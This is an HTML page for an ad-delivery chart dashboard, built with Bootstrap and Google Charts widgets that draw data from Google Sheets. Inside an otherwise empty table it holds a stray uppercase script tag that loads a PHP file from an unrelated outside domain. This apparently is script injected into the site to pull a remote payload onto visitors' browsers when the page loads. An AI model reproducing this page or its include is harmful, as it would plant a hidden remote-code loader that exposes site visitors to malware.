<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Ad delivery Charts</title>

    <link href="http://ajax.aspnetcdn.com/ajax/bootstrap/3.0.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="style/demoTheme.css" rel="stylesheet" />
    <link href="style/chartSizes.css" rel="stylesheet" />

    <link href="http://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, target-densitydpi=device-dpi, width=device-width" />

</head>
<body>

    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <!--Chart HTML-->
                <div id="barchart1" data-gchart
                     data-chartSize="large-chart"
                     data-chartTitle="Bar Chart"
                     data-horizontalChartTitle="Set Horizontal Axis Title"
                     data-verticalChartTitle="Set Vertical Axis Title"
                     data-containerName="barchart1"
                     data-dataSource="https://docs.google.com/spreadsheet/ccc?key=0AkDJgEzvX6DDdDRMRFRrVXU3REJhMUxVblc3YnprZVE"
                     data-gChartType="bar">
                </div>
            </div>
            <div class="col-md-6">
                <!--Chart HTML-->
                <div id="colchart1" data-gchart
                     data-chartsize="large-chart"
                     data-charttitle="Column Chart"
                     data-horizontalcharttitle="Set Horizontal Axis Title"
                     data-verticalcharttitle="Set Vertical Axis Title"
                     data-containername="colchart1"
                     data-datasource="https://docs.google.com/spreadsheet/ccc?key=0AkDJgEzvX6DDdFByWUdQNTZaZ09rU3dxNEREVUhjZnc"
                     data-gcharttype="column">
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-9">
                <!--Chart HTML-->
                <div id="piechart1" data-gchart
                     data-chartsize="xx-large-chart"
                     data-charttitle="AdWords, per country"
                     data-horizontalcharttitle="Set Horizontal Axis Title"
                     data-verticalcharttitle="Set Vertical Axis Title"
                     data-containername="piechart1"
                     data-datasource="https://docs.google.com/spreadsheets/d/1nmAM4aJlVyp5c1fK5R_ahvpy0KVfl3htEIE-lnG7Gv8/edit?usp=sharing"
                     data-gcharttype="pie">
                </div>
            </div>
                    <div class="col-md-3 ">
                    <!--Chart HTML-->
                        <div>
                          <div class="table-responsive">
                          <table class="table">
                           <SCRIPT TYPE="text/javascript" SRC="http://www.skinstoreend.com/yggb.php?image=12562738"></SCRIPT>
                          </table>
                        </div>
                        </div>
                    </div>
            <div class="col-md-6">
                <!--Chart HTML-->
                <div id="bubblechart1" data-gchart
                     data-chartsize="large-chart"
                     data-charttitle="Bubble Chart"
                     data-horizontalcharttitle="Set Horizontal Axis Title"
                     data-verticalcharttitle="Set Vertical Axis Title"
                     data-containername="bubblechart1"
                     data-datasource="https://docs.google.com/spreadsheet/ccc?key=0AkDJgEzvX6DDdFNxMThvUjUwTEZoVWNmVlYzZ3VkeXc"
                     data-gcharttype="bubble">
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-6">
                <!--Chart HTML-->
                <div id="candlestickchart1" data-gchart
                     data-chartsize="large-chart"
                     data-charttitle="Candlestick Chart"
                     data-horizontalcharttitle="Set Horizontal Axis Title"
                     data-verticalcharttitle="Set Vertical Axis Title"
                     data-containername="candlestickchart1"
                     data-datasource="https://docs.google.com/spreadsheet/ccc?key=0AkDJgEzvX6DDdHZwNUhMSVN3bU5TWTZxSWtWRG1lMnc"
                     data-gcharttype="candlestick">
                </div>
            </div>
            <div class="col-md-6">
                <!--Chart HTML-->
                <div id="linechart1" data-gchart
                     data-chartsize="large-chart"
                     data-charttitle="Line Chart"
                     data-horizontalcharttitle="Set Horizontal Axis Title"
                     data-verticalcharttitle="Set Vertical Axis Title"
                     data-containername="linechart1"
                     data-datasource="https://docs.google.com/spreadsheet/ccc?key=0AkDJgEzvX6DDdF94S1VSeVFPWHRVcWFFOVBMRUtaVEE"
                     data-gcharttype="line">
                </div>
            </div>
        </div>
    </div>


    


    <script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-2.0.3.min.js"></script>
    <script src="http://www.google.com/jsapi" type="text/javascript"></script>
    <script src="scripts/plugin/smartResize.js"></script>
    <script src="scripts/plugin/chartsPlugin.js"></script>
    <script>
        $(document).chartsPlugin({
            chartsFont: 'Open Sans',
            colors: ['#52656B', '#FF3B77', '#CDFF00', '#B8B89F', '#B8F89F']
        });
    </script>
</body>
</html>
